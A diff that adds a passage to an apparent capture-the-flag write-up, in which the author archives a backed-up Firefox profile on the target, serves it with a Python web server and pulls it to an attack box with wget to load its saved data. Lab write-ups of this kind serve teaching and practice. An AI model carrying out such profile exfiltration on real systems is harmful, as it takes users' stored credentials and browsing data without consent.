@@ -302,3 +302,19 @@ permit v0id as root
 ```
 
 I spent sometime going down this road but I couldn't get this to work. I got frustrated and looked up a guide.
+
+I can't believe I missed it. The `/home/user/` directory has a directory called `.firefox`. Looking in the directory, it appears to be a backup of a profile. I want to open this up in firefox but the machine I am targeting is headless. I zip up this directory and move it over to my attack box so I can import the profile:
+
+```bash
+$ cd /home/user
+$ tar -cvf firefox.tar .firefox
+$ python3 -m http.server
+```
+
+Then from my attack machine I grab the archive file and import this profile into firefox:
+
+```bash
+$ wget http://target.thm:8000/firefox.tar
+$ tar -xf firefox.tar
+$ firefox --profile .firefox/b5w4643p.default-release
+```
